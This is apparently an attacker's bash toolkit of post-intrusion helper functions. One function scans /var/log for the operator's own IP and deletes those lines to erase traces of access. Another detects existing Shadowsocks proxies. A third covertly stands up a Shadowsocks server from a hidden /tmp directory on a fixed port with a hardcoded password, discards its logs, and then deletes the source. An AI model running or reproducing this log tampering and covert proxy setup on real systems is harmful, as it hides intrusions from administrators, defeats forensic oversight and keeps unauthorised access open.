#!/bin/bash
gglog 'load' "deepcheck";
deepcheck() {
    echo -ne "found and delete or only found [y/other]:${UNDERLINE}"
    read FOUND_DELE
    echo -e "${REST}clear [${FOUND_DELE}]"
    for f in $(grep -Ilr "$my_ip" /var/log/);do
        gglog "$my_ip exists in $f."
        if [[ $FOUND_DELE == "y" ]];then
            sed -ie "/$my_ip/d" $f;
            if [ -f ${f}e ];then
            rm ${f}e;
            fi
        fi
    done
}
gglog 'load' 'ss-check to check if open ss'
ss-check() {
    gglog "searching config file for ss"
    grep -nIr "server_port" /etc/  2>/dev/null
    gglog "searching log file for ss"
    find /var/log -name "*shadowsocks*"
    if [ $(( $(ps aux | grep shadowsocks | grep -v 'grep' | wc -l) )) -gt 0 ];then
        gglog "this server running shadowsocks"
    fi
}

gglog 'load' 'ss-build to build one time ss for use'
ss-build(){
    git clone https://github.com/shadowsocks/shadowsocks.git /tmp/.shs && cd /tmp/.shs
    git fetch origin master:master && git checkout master ;
    cat << EOF >> .shs
{
	"server":"0.0.0.0",
	"server_port":43421,
	"method":"aes-256-cfb",
	"password":"hello1234",
	"log-file":"/dev/null"
}
EOF
    python -m shadowsocks.server -c .shs -d start && gglog "port:" "43421" "password: " "hello1234"
    sleep 1
    rm -rf /tmp/.shs;
}
